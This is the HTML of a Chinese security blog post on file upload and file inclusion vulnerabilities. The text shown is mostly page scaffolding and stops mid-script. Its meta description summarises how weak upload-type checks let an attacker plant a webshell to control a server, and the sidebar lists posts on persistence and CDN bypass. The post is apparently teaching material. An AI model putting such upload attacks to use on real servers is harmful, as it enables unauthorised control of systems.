@@ -1,0 +1,1746 @@
+<!DOCTYPE html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="description" content="任意文件上传
+简述
+
+任意文件上传漏洞往往是服务器提供一定上传接口，但由于对上传文件类型限制逻辑不严格，导致被绕过；攻击者可以直接上传脚本资源文件来控制服务器，也就是sql注入漏洞中介绍的webshell
+
+靶场练习
+找靶场 fofa.in..." />
+    <meta name="keywords" content="Web安全" />
+    <link rel="stylesheet" href="https://xmoct.github.io/media/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://xmoct.github.io/styles/main.css">
+    <!-- 代码渲染风格css -->
+    
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.18.1/build/styles/default.min.css">
+    
+    <!-- 代码高亮插件 -->
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.18.1/build/highlight.min.js"></script>
+    <!-- 代码复制插件 -->
+    <script src="https://cdn.jsdelivr.net/gh/850552586/ericamcdn@0.1/js/clipboard.min.js"></script>
+    <!-- live2d插件 -->
+    <link rel="stylesheet" href="https://xmoct.github.io/media/css/live2d.css">
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js"></script>
+    <!-- 最新版本的 Bootstrap 核心 CSS 文件 -->
+    <link href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.13.1/css/all.min.css" rel="stylesheet">
+    <!-- 数学公式 -->
+    
+    <title>文件上传和文件包含</title>
+
+    <!-- 大纲索引css调整 -->
+    
+    <style>
+        .markdownIt-TOC {
+            margin-left: 28%;
+            padding-left: 2px;
+            width: 80%;
+        }
+
+        .markdownIt-TOC li {
+            padding-left: 8%;
+        }
+    </style>
+    
+</head>
+
+<body>
+    <div id="landlord">
+        <div class="message" style="opacity:0"></div>
+        <canvas id="live2d" width="240" height="250" class="live2d"></canvas>
+    </div>
+    <div id="domainname" style="display:none">https://xmoct.github.io</div>
+    <div id="content">
+        <div>
+            <!----------- 移动端导航栏👇 ----------------->
+            <div id="bar">
+                <style>
+  .navmobile {
+    z-index: 15;
+    max-height: 40vh;
+    overflow-y: scroll;
+    overflow-x: hidden;
+  }
+
+  @media screen and (max-width: 1200px) {
+    .navbar {
+      max-width: 100vw;
+    }
+  }
+
+  @media screen and (max-width:1200px) and (min-width: 768px) {
+    @media (min-width: 768px) {
+      .navbar-nav {
+        float: right;
+        margin: 0;
+      }
+    }
+  }
+
+  @media screen and (max-width:768px) {
+    .mbapspan {
+      padding: 0;
+    }
+  }
+</style>
+<div class="pjaxloading"  onclick="pjaxloadingClose()">
+  <div class="loadingbackground"></div>
+  <div id="loading">
+    <div class="loading">
+    </div>
+  </div>
+</div>
+<nav class="navbar navbar-inverse navbar-fixed-top navmobile">
+  <div class="container-fluid">
+    <!-- Brand and toggle get grouped for better mobile display -->
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#barmenu"
+        aria-expanded="false" id="barbutton">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a data-pjax class="navbar-brand" style="color:white" href="https://xmoct.github.io">Moyv_blog&nbsp;&nbsp;|</a>
+      <span class="navbar-brand mbapspan"><i id="mbaplayer" class="fa fa-play-circle-o" aria-hidden="true"
+          style="font-size: 28px;top: 12px;position: absolute;" onclick="aplayerPlay();"></i></span>
+    </div>
+
+    <!-- Collect the nav links, forms, and other content for toggling -->
+    <div class="collapse navbar-collapse" id="barmenu">
+      <ul class="nav navbar-nav">
+        
+        
+        <li>
+          <a data-pjax href="/" style="color:white">
+            首页
+          </a>
+        </li>
+        
+        
+        
+        <li>
+          <a data-pjax href="/archives" style="color:white">
+            归档
+          </a>
+        </li>
+        
+        
+        
+        <li>
+          <a data-pjax href="/tags" style="color:white">
+            标签
+          </a>
+        </li>
+        
+        
+        
+        <li>
+          <a data-pjax href="/post/about" style="color:white">
+            关于
+          </a>
+        </li>
+        
+        
+        
+        
+          
+        <li><a data-pjax href="https://xmoct.github.io/friends" style="color:white">友链</a></li>
+
+        
+        </ul>
+      </div><!-- /.navbar-collapse -->
+    </div><!-- /.container-fluid -->
+  </nav>
+
+
+  <!-- 引入jQuery核心js文件 -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js"></script>
+  <script>
+    let btstate = false;
+    var bt = $("#barbutton");
+    var bm = $("#barmenu");
+    bt.click(function () {
+      dropdown();
+    })
+    function dropdown() {
+      console.log(btstate);
+      //下拉
+      if (btstate == false) {
+        bt.removeClass("collapsed");
+        bt.attr("aria-expanded", "true");
+        bm.attr("aria-expanded", "true")
+        bm.fadeIn(700);
+        btstate = true;
+      }
+      else {
+        bt.addClass("collapsed");
+        bt.attr("aria-expanded", "false");
+        bm.removeClass("in");
+        bm.hide();
+        bm.attr("aria-expanded", "false");
+        btstate = false;
+      }
+    }
+  </script> 
+            </div>
+            <!----------- 移动端导航栏👆 ----------------->
+
+            <!--------------- pc端菜单栏👇 ---------------->
+            <div class="side"><head>
+    <link rel="stylesheet" href="https://xmoct.github.io/media/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://xmoct.github.io/styles/main.css">
+    
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.18.1/build/styles/default.min.css">
+    
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.18.1/build/highlight.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/850552586/ericamcdn@0.1/js/clipboard.min.js"></script>
+    <link rel="stylesheet" href="https://xmoct.github.io/media/css/live2d.css">
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+    <!-- 最新版本的 Bootstrap 核心 CSS 文件 -->
+    <link href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.13.1/css/all.min.css" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+    <!-- fancybox -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+    <!--------- 数学公式👇---- -->
+    
+    <!--------- 数学公式👆----------------- -->
+    <!--------- daovocie功能👇 ------------------->
+    
+    <!--------- daovocie功能👆 ------------------->
+    <!-- -----------------twikoo评论系统引入👇 --------->
+    <script src="https://cdn.jsdelivr.net/npm/twikoo@1.3.1/dist/twikoo.all.min.js"></script>
+    <!-- -----------------twikoo评论系统引入👆 --------->
+    <!---------------- leancloud api 功能依赖引入👇 -------->
+    <script src="https://cdn.jsdelivr.net/npm/leancloud-storage@3.13.0/dist/av-min.js"></script>
+    <!---------------- leancloud api 功能依赖引入👆 -------->
+    <!------------------ valine评论系统引入👇 ------------------>
+    <script src="https://xmoct.github.io/media/js/valine.min.js"></script>
+    <!------------------ valine评论系统引入👆 ------------------>
+    <!---------------- 今日诗词api功能依赖👇 ----------------------->
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+    <!---------------- 今日诗词api功能依赖👆 ----------------------->
+    <!---------------- 今日诗词api功能依赖👇 ----------------------->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/ispeak-bber/ispeak-bber.min.js" charset="utf-8"></script>
+    <!---------------- 哔哔功能依赖👆 ----------------------->
+
+
+</head>
+
+<style>
+    body {
+        overflow-x: hidden;
+        height: 100vh;
+        overflow-y: scroll;
+        cursor: url("https://xmoct.github.io/media/images/mouse_cursor.png"), auto
+    }
+</style>
+
+<body>
+    <!--=------ 页面加载动态画面👇 --------------->
+    <div class="pjaxloading" onclick="pjaxloadingClose()">
+        <div class="loadingbackground"></div>
+        <div id="loading-aname">
+            <div class="loading-aname">
+            </div>
+        </div>
+    </div>
+    <!--=------ 页面加载动态画面👆 --------------->
+
+    <!--------------- 左侧菜单栏👇 ------------------------>
+    
+    <div id=side>
+        <div class="r_m_div">
+            <a onclick="showAaplayer()"><i style="font-size: 20px;"><img
+                        src='https://xmoct.github.io/media/images/music.png' alt="音乐播放器" class="musicbtn"></i></a>
+        </div>
+        <div class="avatar-border">
+            <img src="https://xmoct.github.io/images/avatar.png?v=1690609173162" class="avatar">
+        </div>
+        <div class="sitename">Moyv_blog</div>
+        <span class="description" data-text='["生前何必久睡，死后必定长眠"]'>&nbsp;</span>
+        <div class="siteinfocontainer">
+            <span class="siteinfo">文章</span>
+            <span class="siteinfo">标签</span>
+        </div>
+        <div class="siteinfocontainer">
+            <span class="siteinfo" id="siteinfo-postsnum"></span>
+            <span class="siteinfo">5</span>
+        </div>
+        
+        <div class="search">
+            <!-- <input type="text" class="search-input" placeholder="标题搜索(●'◡'●)" /> -->
+            <input type="text" class="search-input" placeholder="标题搜索 ⚆_⚆ つ♡">
+            <div class="search-results"></div>
+        </div>
+        
+    <div class="share-button">
+        <span></span>
+        
+        
+        
+        
+        
+        
+        
+        
+    </div>
+    <div id="qq" style="display:none"></div>
+    <!------------ 加载菜单按钮👇 ------------------------->
+    <div class="menucontainer">
+        
+        
+        <div class="mchocie description">
+            <a data-pjax href="/" class="menubutton" style="margin-right: 15px;">
+                <i><img class="icon menuicon" src="" alt="首页"></i>&nbsp;<span
+                    data-text="首页">首页</span>
+            </a>
+        </div>
+        
+        
+        
+        <div class="mchocie description">
+            <a data-pjax href="/archives" class="menubutton" style="margin-right: 15px;">
+                <i><img class="icon menuicon" src="" alt="归档"></i>&nbsp;<span
+                    data-text="归档">归档</span>
+            </a>
+        </div>
+        
+        
+        
+        <div class="mchocie description">
+            <a data-pjax href="/tags" class="menubutton" style="margin-right: 15px;">
+                <i><img class="icon menuicon" src="" alt="标签"></i>&nbsp;<span
+                    data-text="标签">标签</span>
+            </a>
+        </div>
+        
+        
+        
+        <div class="mchocie description">
+            <a data-pjax href="/post/about" class="menubutton" style="margin-right: 15px;">
+                <i><img class="icon menuicon" src="" alt="关于"></i>&nbsp;<span
+                    data-text="关于">关于</span>
+            </a>
+        </div>
+        
+        
+
+        
+        
+        
+        <div class="mchocie description">
+            <a data-pjax href="https://xmoct.github.io/friends" class="menubutton" style="margin-right: 15px;">
+                <i><img class="icon menuicon" src="" alt="友人帐"></i>&nbsp;<span data-text="友人帐">友人帐</span>
+            </a>
+        </div>
+        
+        <!--  -->
+    </div>
+    <!------------ 加载菜单按钮👆 ------------------------->
+    <hr>
+    <style>
+    .copyright {
+        font-size: 15px;
+        color: #d9d9d9;
+    }
+
+
+    @media screen and (min-width: 1200px) {
+        .foot {
+            width: 100%;
+            height: 130px;
+        }
+    }
+
+    @media screen and (max-width: 1200px) {
+        .foot {
+            display: none;
+        }
+    }
+</style>
+
+<body>
+    <div class="foot">
+        <div id="footinfo">Powered by <a href="https://github.com/xmoct" target="_blank">墨羽</a> | Theme: <a
+                href="https://github.com/850552586/gridea-theme-fog">Fog</a>
+            <div>
+                
+            </div>
+            <div>
+                
+            </div>
+            <div class="copyright" style="color:white;text-align: center;">Copyright © 2020  备案号: 鄂ICP备...号
+            </div>
+        </div>
+
+
+
+    </div>
+</body>
+
+    </div>
+
+    <img class="moon" src="https://xmoct.github.io/media/images/moon.png" onclick="moonlight()">
+    <script src="https://xmoct.github.io/media/js/wordshow.js"></script>
+    
+    <!--------------- 左侧菜单栏👆 ------------------------>
+
+    <!----------------- 顶部菜单栏👇 ------------------------>
+    
+    <!----------------- 顶部菜单栏👆 ------------------------>
+
+<!--核心功能加载-->
+<script src="https://xmoct.github.io/media/js/mainfunc.js"></script>
+
+<!------------- Fog1.0版本彩蛋👇 -------------->
+    <!-- <section id="terrestrial" class="popup">
+        <a href="#" class="back">&lt; back</a>
+    </section>
+
+    <div class="flycontainer">
+        <div class="flyword">御风飞行中...</div>
+    </div>
+
+    <script>
+        $("#fog_go").click(function(){fog_go()});
+        async function fog_go(){
+            $(".bars").hide()
+            $("#live2d").hide()
+            await sleep(3000);
+            $(".flycontainer").css("display","flex");
+            $(".popup").fadeOut(500)
+            await sleep(2000);
+            var sitename = "Moyv_blog";
+            getFogUser(sitename);
+        }
+
+        function fog_goregis(){
+            var sitename = "Moyv_blog";
+            var siteurl = "https://xmoct.github.io";
+            regisFogUser(sitename,siteurl);
+        }
+        fog_goregis();
+    </script> -->
+<!------------- Fog1.0版本彩蛋👆 -------------->
+<script>
+    function change_topmenu(){
+        tmcolor = "antiquewhite"
+        tsnamecolor = "antiquewhite"
+        $(".navbar-inverse .navbar-nav>li>a").css("color",tmcolor)
+        $(".navbar-inverse .navbar-brand").css("color",tsnamecolor)
+        $(".navbar-fixed-top").css("border-radius","0 0 10px 10px")
+    }
+</script>
+
+<!------ 根据自定义配置声明变量👇 --------------------->
+    
+    <script>
+        var postnumChoice = false
+    </script>
+    
+    
+    <script>
+        var shareChoice = false
+    </script>
+    
+    
+    <script>
+        var donateChoice = false
+    </script>
+    
+    
+    <script>
+        var searchChoice = true
+    </script>
+    
+    <script>let postsnum = 0;</script>
+    <div id="side-posttitle" style="display: none;">
+    
+    
+    逻辑漏洞
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    3. 信息收集
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    实战SRC挖掘
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    自动化扫描工具
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    命令执行和代码执行
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    文件上传和文件包含
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    跨站脚本攻击
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    C++编程2
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    C++编程1
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    
+    
+    CDN绕过
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    权限维持
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    
+    
+    
+    
+    代码审计
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    主动信息收集
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    被动信息收集
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    关于
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    
+    Hello Gridea 
+    <script>
+        postsnum += 1
+    </script>
+    
+    
+    </div>
+    
+        <script>
+            var menupos = 'left';
+            $("#siteinfo-postsnum").html(postsnum);
+        </script>
+    
+    <script>
+        let commentsHide = false
+    </script>
+    <!------ 根据自定义配置声明变量👆 --------------------->
+
+
+    <!----------根据自定义配置设置图标信息👇---------->
+    <script>
+        var icondict = new Array();
+    </script>
+    
+        
+    
+    <!----------根据自定义配置设置图标信息👆---------->
+</body>
+
+<script src="https://xmoct.github.io/media/share/dist/Share.js"></script>
+<!-- 页面pjax测试 -->
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.pjax/2.0.1/jquery.pjax.js"></script>
+<!--确保jQuery已经在此之前加载-->
+<!-- <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script> -->
+<script src="https://xmoct.github.io/media/js/all-pjax.js"></script>
+<script>
+    //-------------------------------说说功能👇--------------------------------------
+    let talksall = [];
+    let talks = [];
+    let talkindex = 0;
+    get();
+
+    function get() {
+        var t = JSON.parse('[]');
+        talkindex = t.length - 1;
+        for (var i = 0; i <= t.length - 1; i++) {
+            var d = {};
+            d["time"] = t[i].time;
+            d["author"] = t[i].author;
+            d["text"] = t[i].text;
+            d["img"] = t[i].img;
+            talksall.push(d);
+        }
+    }
+
+    function add() {
+        for (var i = talkindex; i >= 0 && i > talkindex - 3; i--) {
+            talks.push(talksall[i]);
+        }
+        talkindex = (talkindex - 3) >= 0 ? (talkindex - 3) : -1;
+        if (talkindex < 0) $("#getmorebt").hide();
+        show();
+    }
+
+    function show() {
+        var talkT = document.getElementById("talkContainer");
+        talkT.innerHTML = "";
+        for (var i = 0; i < talks.length; i++) {
+            if (talks[i].img != '') {
+                talkT.innerHTML += '\
+            <div class="talk" v-for="t in talks"> \
+                <span data-fancybox="images" href="' + talks[i].img + '"><img src="' + talks[i].img + '" class="talkimg"></span> \
+                <div class="ainfo">\
+                    <div class="ainfo-intro">\
+                        <div class="author">' + talks[i].author + '</div>·\
+                        <div class="time">' + talks[i].time + '</div>\
+                    </div>\
+                </div>\
+                <div class="talkcontent">' + talks[i].text + '\
+                </div\>\
+            ';
+            } else {
+                talkT.innerHTML += '\
+            <div class="talk" v-for="t in talks"> \
+                <div class="ainfo">\
+                    <div class="ainfo-intro">\
+                        <div class="author">' + talks[i].author + '</div>·\
+                        <div class="time">' + talks[i].time + '</div>\
+                    </div>\
+                </div>\
+                <div class="talkcontent">' + talks[i].text + '\
+                </div\>\
+            ';
+            }
+        }
+    }
+    //-------------------------------说说功能👆--------------------------------------
+</script>
+
+<!---->
+<script>
+    function replaceAvatar() {
+        twikoo_avatar = $(".tk-avatar-img");
+        for (var i = 0; i < twikoo_avatar.length; i++) {
+            var asrc = twikoo_avatar.eq(i).attr('src');
+            if (asrc.search('cn.gravatar.com') != -1) {
+                twikoo_avatar.eq(i).attr('src', 'https://xmoct.github.io/media/images/comavatar.png');
+            }
+        }
+    }
+
+    function showWechat() {
+        var wechat = '';
+        alert("博主微信号：" + wechat);
+        return false;
+    }
+</script>
+
+<script>
+    /**
+     * https://github.com/tangkaichuan/gridea-search
+     */
+    // 检查缓存是否最新
+    function checkCache() {
+        var caches_postsnum = localStorage.getItem("postsnum");
+        var pt = document.getElementById("side-posttitle").innerHTML;
+        pt = pt.replace(/\s+/g, '').replace(/<script>.*?<\/script>/gi, "")
+        var ptlen = pt.length;
+        var ptlen_storage = localStorage.getItem("poststitlelen");
+        if (caches_postsnum != postsnum || ptlen != ptlen_storage) {
+            console.log("更新缓存");
+            return false
+        }
+        return true;
+    }
+
+    (function () {
+        var CACHES = checkCache()
+        if (!CACHES) {
+            var NOW = Date.now()
+            var API_CONTENT = '../api-content/index.html' + '?_=' + NOW
+            preload(API_CONTENT);
+            getContents(show_getContentresult);
+        }
+
+        function show_getContentresult(data) {
+            console.log("获取成功");
+            var postslen = data["posts"].length;
+            localStorage.setItem('postsnum', postslen);
+            var poststitlelen = 0;
+            var pt = document.getElementById("side-posttitle").innerHTML;
+            pt = pt.replace(/\s+/g, '').replace(/<script>.*?<\/script>/gi, "");
+            localStorage.setItem('poststitlelen', pt.length);
+        }
+
+
+
+        // preload
+        function preload(url) {
+            var preloadLink = document.createElement('link')
+            preloadLink.href = url
+            preloadLink.rel = 'preload'
+            preloadLink.as = 'fetch'
+            preloadLink.crossOrigin = 'anonymous'
+            document.head.appendChild(preloadLink)
+        }
+
+        // 异步 GET 请求
+        function get(obj) {
+            var xhr = new XMLHttpRequest()
+            xhr.open('get', obj.url, true)
+            xhr.send(null)
+            xhr.onreadystatechange = function () {
+                // 异步请求：响应状态为4，数据加载完毕
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200) {
+                        obj.success(xhr.responseText)
+                    } else {
+                        obj.error(xhr.status)
+                    }
+                }
+            }
+        }
+
+        // 获取博客全文 api
+        function getContents(callback) {
+            if (CACHES) {
+                callback(CACHES.contents)
+            } else {
+                get({
+                    url: API_CONTENT,
+                    success: function (data) {
+                        callback(JSON.parse(data));
+                        localStorage.setItem('ContentsCache', data);
+                        getStorageContent();
+                    }
+                })
+            }
+        }
+    })()
+    //------------------------核心功能--pjax全局渲染👇-------------------
+    let talkinit = false;
+    $(document).pjax('a[data-pjax]', '#main', {
+        fragment: '#main',
+        timeout: 8000
+    }).on('pjax:complete', function () {
+        //代码块高亮渲染
+        document.querySelectorAll('pre code').forEach((block) => {
+            hljs.highlightBlock(block);
+        });
+        //文章热度
+        if(postnumChoice){
+            getHotnum();
+        }
+        //文章索引
+        toginit();
+        //清空搜索栏
+        if (searchChoice) {
+            searchInit();
+            searchInput.value = "";
+        }
+        var pl = window.location.pathname;
+        //说说更新
+        if (pl.search("talk") != -1 && !talkinit) {
+            add();
+            talkinit = true;
+        } else if (pl.search("talk") != -1) {
+            show();
+        }
+        if (pl.search("post") != -1) {
+            if (shareChoice)
+                shareInit();
+            if (donateChoice)
+                donateInit();
+            if ("default" == "default"&&!commentsHide) {
+                $("#comment").hide()
+                commentsHide = true
+            }
+            lazyload();
+            codeinit();
+            if ("default" == "twikoo") {
+                //twikoo头像更换
+                setTimeout(replaceAvatar, 3000);
+                setTimeout(replaceAvatar, 8000); //部分博主站点速度加载过慢，再添加一个延迟
+            }
+        }
+        if (btstate == true)
+            dropdown();
+    }).on('pjax:start', function () {
+        $(".pjaxloading").fadeIn(50);
+    }).on('pjax:end', function () {
+        $(".pjaxloading").fadeOut(50);
+    });
+    //------------------------核心功能--pjax全局渲染👆-------------------
+
+    //-------------------------------------------------搜索
+    // 获取搜索框、搜索按钮、清空搜索、结果输出对应的元素
+    if (searchChoice) {
+        var searchInput = document.querySelector('.search-input');
+        var searchResults = document.querySelector('.search-results');
+    }
+    // 申明保存文章的标题、链接、内容的数组变量
+    var searchValue = '',
+        arrItems = [],
+        arrLinks = [],
+        arrTitles = [],
+        arrContents = [],
+        arrResults = [],
+        indexItem = [],
+        itemLength = 0;
+    var tmpDiv = document.createElement('div');
+    tmpDiv.className = 'result-item';
+
+
+    function getStorageContent() {
+        var data = localStorage.getItem('ContentsCache');
+        data = JSON.parse(data);
+        posts = data["posts"];
+        for (var i = 0; i < posts.length; i++) {
+            arrLinks[i] = posts[i].link;
+            arrTitles[i] = posts[i].title;
+            arrContents[i] = posts[i].content;
+            itemLength++;
+        }
+    }
+    if (checkCache())
+        getStorageContent();
+    // 输入框内容变化后就开始匹配，可以不用点按钮
+    // 经测试，onkeydown, onchange 等方法效果不太理想，
+    // 存在输入延迟等问题，最后发现触发 input 事件最理想，
+    // 并且可以处理中文输入法拼写的变化
+    searchInput.oninput = function () {
+        setTimeout(searchConfirm, 0);
+    }
+    searchInput.onfocus = function () {
+        searchResults.style.display = 'block';
+    }
+
+    function searchConfirm() {
+        if (searchInput.value == '') {
+            searchResults.style.display = 'none';
+        } else if (searchInput.value.search(/^\s+$/) >= 0) {
+            // 检测输入值全是空白的情况
+            searchInit();
+            var itemDiv = tmpDiv.cloneNode(true);
+            itemDiv.innerText = '请输入有效内容...';
+            searchResults.appendChild(itemDiv);
+        } else {
+            // 合法输入值的情况
+            searchInit();
+            searchValue = searchInput.value;
+            // 在标题、内容中查找
+            searchMatching(arrTitles, arrContents, searchValue);
+        }
+    }
+
+    // 每次搜索完成后的初始化
+    function searchInit() {
+        arrResults = [];
+        indexItem = [];
+        searchResults.innerHTML = '';
+        searchResults.style.display = 'block';
+    }
+
+    function searchMatching(arr1, arr2, input) {
+        // 忽略输入大小写
+        input = new RegExp(input, 'i');
+        var step = 10;
+        // 在所有文章标题、内容中匹配查询值
+        for (i = 0; i < itemLength; i++) {
+            var indexContent = arr2[i].search(input);
+            //标题匹配
+            if (arr1[i].search(input) != -1) {
+                indexItem.push(i); // 保存匹配值的索引
+                if (indexContent != -1) {
+                    startindex = (indexContent - step) >= 0 ? (indexContent - step) : 0;
+                    var searchcontent = arr2[i].slice(indexContent - step, indexContent + 5)
+                    arrResults.push("....." + searchcontent + ".....");
+                } else
+                    arrResults.push("");
+            }
+            //内容匹配
+            else if (indexContent != -1) {
+                indexItem.push(i); // 保存匹配值的索引
+
+                startindex = (indexContent - step) >= 0 ? (indexContent - step) : 0;
+                var searchcontent = arr2[i].slice(indexContent - step, indexContent + 5)
+                arrResults.push("....." + searchcontent + ".....");
+            }
+        }
+
+        // 输出总共匹配到的数目
+        var totalDiv = tmpDiv.cloneNode(true);
+        totalDiv.innerHTML = '<b>总匹配：' + indexItem.length + ' 项<hr></b>';
+        searchResults.appendChild(totalDiv);
+
+        // 未匹配到内容的情况
+        if (indexItem.length == 0) {
+            var itemDiv = tmpDiv.cloneNode(true);
+            itemDiv.innerText = '未匹配到内容...';
+            searchResults.appendChild(itemDiv);
+        }
+
+        // 将所有匹配内容进行组合
+        for (i = 0; i < arrResults.length; i++) {
+            var itemDiv = tmpDiv.cloneNode(true);
+            itemDiv.innerHTML = '<a data-pjax class="searchresults" href="' + arrLinks[indexItem[i]] + '"><b>[' +
+                arrTitles[indexItem[i]] +
+                ']</b><p>' + arrResults[i] + '</p></a><hr />';
+            searchResults.appendChild(itemDiv);
+        }
+    }
+</script>
+
+
+
+<!--------------------- 菜单栏图标加载功能👇 ----------------------->
+<script>
+var menulist = $(".menuicon");
+var menulength = menulist.length;
+for (var i = 0; i < menulength; i++) {
+    var altname = menulist.eq(i).attr("alt");
+    var iconurl = icondict[altname];
+    if (iconurl == undefined || iconurl == '')
+        continue;
+    if (iconurl == 'Home') {
+        menulist.eq(i).attr("src", "https://xmoct.github.io/media/images/Home.png");
+menulist.eq(i).show();
+} else if (iconurl == 'Archive') {
+menulist.eq(i).attr("src", "https://xmoct.github.io/media/images/Archive.png");
+menulist.eq(i).show();
+} else if (iconurl == 'Tag') {
+menulist.eq(i).attr("src", "https://xmoct.github.io/media/images/Tag.png");
+menulist.eq(i).show();
+} else if (iconurl == 'About') {
+menulist.eq(i).attr("src", "https://xmoct.github.io/media/images/About.png");
+menulist.eq(i).show();
+} else if (iconurl == 'Talk') {
+menulist.eq(i).attr("src", "https://xmoct.github.io/media/images/Talk.png");
+menulist.eq(i).show();
+} else if (iconurl == 'Friends') {
+menulist.eq(i).attr("src", "https://xmoct.github.io/media/images/Friends.png");
+menulist.eq(i).show();
+} else if (iconurl == 'Fly') {
+menulist.eq(i).attr("src", "https://xmoct.github.io/media/images/wind.png");
+menulist.eq(i).show();
+} else {
+menulist.eq(i).attr("src", iconurl);
+menulist.eq(i).show();
+}
+}
+</script>
+<!--------------------- 菜单栏图标加载功能👆 ----------------------->
+
+<script>
+    //--------------------bber-onetalk加载👇--------------------------------
+    function bberonetalkLoad(){
+        bberjsonurl = '';
+        if ( $("#bber-talk").length > 0 ) {
+        jsonUrl = bberjsonurl
+        $.getJSON(jsonUrl+"?t="+Date.parse( new Date()),function(res){
+        var bberHtml = ''
+        $.each(res.data, function(i, item){
+            d = new Date(item.date)
+            date = d.getFullYear()+'/'+(d.getMonth()+1)+'/'+d.getDate() +' '+d.getHours()+':'+d.getMinutes()+':'+d.getSeconds()
+            dataTime = '<span class="datatime">'+date+'</span>'
+            bberHtml += '<li class="item item-'+(i+1)+'">'+dataTime+'： <a data-pjax href="https://xmoct.github.io/bber">'+item.content+'</a></li>'
+        });
+        $('#bber-talk').append('<span class="index-talk-icon"><svg viewBox="0 0 1024 1024" width="21" height="21"><path d="M184.32 891.667692c-12.603077 0-25.206154-2.363077-37.809231-7.876923-37.021538-14.966154-59.864615-49.624615-59.864615-89.009231v-275.692307c0-212.676923 173.292308-385.969231 385.969231-385.969231h78.76923c212.676923 0 385.969231 173.292308 385.969231 385.969231 0 169.353846-137.846154 307.2-307.2 307.2H289.083077l-37.021539 37.021538c-18.904615 18.116923-43.323077 28.356923-67.741538 28.356923zM472.615385 195.347692c-178.018462 0-322.953846 144.935385-322.953847 322.953846v275.692308c0 21.267692 15.753846 29.144615 20.48 31.507692 4.726154 2.363077 22.055385 7.876923 37.021539-7.08923l46.473846-46.473846c6.301538-6.301538 14.178462-9.452308 22.055385-9.452308h354.461538c134.695385 0 244.184615-109.489231 244.184616-244.184616 0-178.018462-144.935385-322.953846-322.953847-322.953846H472.615385z"></path><path d="M321.378462 512m-59.076924 0a59.076923 59.076923 0 1 0 118.153847 0 59.076923 59.076923 0 1 0-118.153847 0Z"></path><path d="M518.301538 512m-59.076923 0a59.076923 59.076923 0 1 0 118.153847 0 59.076923 59.076923 0 1 0-118.153847 0Z"></path><path d="M715.224615 512m-59.076923 0a59.076923 59.076923 0 1 0 118.153846 0 59.076923 59.076923 0 1 0-118.153846 0Z"></path></svg></span><ul class="talk-list">'+bberHtml+'</ul>')
+        //Lately({ 'target': '#bber-talk .datatime' });
+        });
+        function Roll (){
+        var list_li = $('.talk-list li'),cur_li = list_li.first(),last_li = list_li.last();
+        last_li.after(cur_li);
+        };
+        setInterval(Roll,3000);
+    }
+    }
+  //--------------------bber-onetalk加载👆--------------------------------
+</script>
+
+<script>
+    var ClicksideState = 1
+    var cur_readingmode = false
+    function readingmode(){
+        if (!cur_readingmode){
+            if(menupos == 'left'){
+                if(ClicksideState==1)
+                menu_openclose1()
+            }
+            $("#tab1").fadeOut(50)
+            $("#bg").fadeOut(50)
+            $(".navbar").fadeOut(50)
+            $(".markdownIt-TOC li a").css("color","black")
+            cur_readingmode = true
+        }else{
+            if(menupos == 'left'){
+                if(ClicksideState==0)
+                    menu_openclose1()
+            }
+            $("#tab1").fadeIn(50)
+            $("#bg").fadeIn(50)
+            $(".navbar").fadeIn(50)
+            $(".markdownIt-TOC li a").css("color","antiquewhite")
+            cur_readingmode = false  
+        }
+    }
+</script>
+
+
+<!----夜间模式👇-->
+<script>
+    var moonlightState = false
+    function moonlight(){
+        if(!moonlightState){
+            $("#bg").fadeOut(200)
+            $('body').css("background","rgba(224,255,255,0.8)")
+            $(".markdownIt-TOC li a").css("color","white")
+            $(".text p, .text ul").css("color","white")
+            $("#articlecontent").css("color","white")
+            $(".post-copyright").css("background","rgba(10,10,10,0.5)")
+            $('blockquote').css("background","rgba(10,10,10,0.6)")
+            $("#articlecontent").css("background","rgba(10,10,10,0.5)")
+            moonlightState = true
